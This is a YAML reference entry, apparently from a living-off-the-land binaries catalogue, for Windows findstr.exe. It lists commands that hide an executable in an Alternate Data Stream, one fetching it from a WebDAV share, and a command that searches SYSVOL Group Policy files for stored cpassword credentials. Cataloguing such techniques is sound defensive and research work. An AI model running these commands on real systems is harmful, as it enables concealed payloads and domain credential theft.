---
Name: Findstr.exe
Description: Add ADS, Search
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
    Description: 'Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.'
  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
    Description: 'Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.'
  - Command: findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
    Description: 'Search for stored password in Group Policy files stored on SYSVOL.'
Full Path:
  - c:\windows\system32\findstr.exe
  - c:\windows\sysWOW64\findstr.exe
Code Sample: []
Detection: []
Resources:
  - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Notes: Thanks to Oddvar Moe - @oddvarmoe

